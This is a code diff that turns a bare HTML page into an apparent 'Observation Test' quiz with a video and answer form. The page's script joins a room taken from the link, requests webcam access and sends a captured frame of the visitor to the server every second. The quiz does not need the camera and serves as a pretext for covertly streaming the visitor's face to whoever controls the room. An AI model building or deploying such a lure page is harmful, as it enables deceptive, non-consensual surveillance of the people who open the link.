@@ -1,68 +1,87 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <title>Hello</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
-  <h1>Welcome Bro...</h1>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Hello</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
 
+  <body>
+    <header>
+      <h1></h1>
+    </header>
 
+    <main>
+      <section>
+        <h2>Observation Test</h2>
+        <div class="video">
+          <video class="ques"
+            src="./assets/video/obeservation - Made with Clipchamp.mp4"
+            autoplay
+            controls
+            loop
+          ></video>
+          <video class="ans" ></video>
+        </div>
 
+        <form action="">
+          <input
+            class="userInput"
+            type="number"
+            placeholder="Enter the correct answer"
+          />
+          <button class="sendButton">Send</button>
+          <button class="retry">Try again</button>
+        </form>
+      </section>
+    </main>
 
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      const socket = io();
+      const urlParams = new URLSearchParams(window.location.search);
+      const roomId = urlParams.get("room");
 
+      // const status = document.getElementById("status");
 
-
-
-
-
-
-
-  
-
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
-    const urlParams = new URLSearchParams(window.location.search);
-    const roomId = urlParams.get("room");
-
-    // const status = document.getElementById("status");
-
-    if (roomId) {
-      socket.emit("join-room", roomId);
-    }
-
-    socket.on("joined-room", async (success) => {
-      if (!success) {
-        status.innerText = "Invalid or expired link.";
-        return;
+      if (roomId) {
+        socket.emit("join-room", roomId);
       }
 
-      status.innerText = "Camera permission required...";
+      socket.on("joined-room", async (success) => {
+        if (!success) {
+          status.innerText = "Invalid or expired link.";
+          return;
+        }
 
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
+        status.innerText = "Camera permission required...";
 
-        const canvas = document.createElement("canvas");
-        const ctx = canvas.getContext("2d");
-        canvas.width = 320;
-        canvas.height = 240;
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
 
-        status.innerText = "Streaming...";
+          const canvas = document.createElement("canvas");
+          const ctx = canvas.getContext("2d");
+          canvas.width = 320;
+          canvas.height = 240;
 
-        setInterval(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const image = canvas.toDataURL("image/jpeg", 0.6);
-          socket.emit("send-image", { roomId, image });
-        }, 1000);
+          status.innerText = "Streaming...";
 
-      } catch (err) {
-        status.innerText = "Camera permission denied.";
-      }
-    });
-  </script>
-</body>
+          setInterval(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const image = canvas.toDataURL("image/jpeg", 0.6);
+            socket.emit("send-image", { roomId, image });
+          }, 1000);
+        } catch (err) {
+          status.innerText = "Camera permission denied.";
+        }
+      });
+    </script>
+    <script src="./assets/js/viewer.js"></script>
+  </body>
 </html>
